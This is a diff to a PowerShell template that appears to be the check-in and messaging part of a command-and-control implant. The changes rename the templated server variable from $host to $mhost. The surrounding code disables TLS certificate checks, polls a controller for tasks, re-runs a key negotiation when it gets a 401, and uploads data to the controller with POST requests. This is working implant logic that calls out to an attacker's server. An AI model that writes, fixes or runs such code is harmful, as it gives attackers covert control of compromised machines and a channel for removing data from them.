@@ -1,9 +1,9 @@
 $Script:index = 0;
-$Script:host = "{{ host }}";
-if ($host.StartsWith('https')) {
+$Script:mhost = "{{ host }}";
+if ($mhost.StartsWith('https')) {
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
 }
-$Script:servers = @($Script:host);
+$Script:servers = @($Script:mhost);
 
 $Script:GetTask = {
     try {
@@ -28,7 +28,7 @@ $Script:GetTask = {
     } catch [Net.WebException] {
         $Script:missedCheckins += 1;
         if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-            Start-Negotiate -S "$Script:host" -SK $SK -UA $ua;
+            Start-Negotiate -S "$Script:mhost" -SK $SK -UA $ua;
         }
     }
 };
@@ -54,7 +54,7 @@ $Script:SendMessage = {
                 $response = $client.UploadData($Script:servers[$Script:index] + $uri, 'POST', $packet);
             } catch [System.Net.WebException] {
                 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                    Start-Negotiate -S "$Script:host" -SK $SK -UA $ua;
+                    Start-Negotiate -S "$Script:mhost" -SK $SK -UA $ua;
                 }
             }
         }
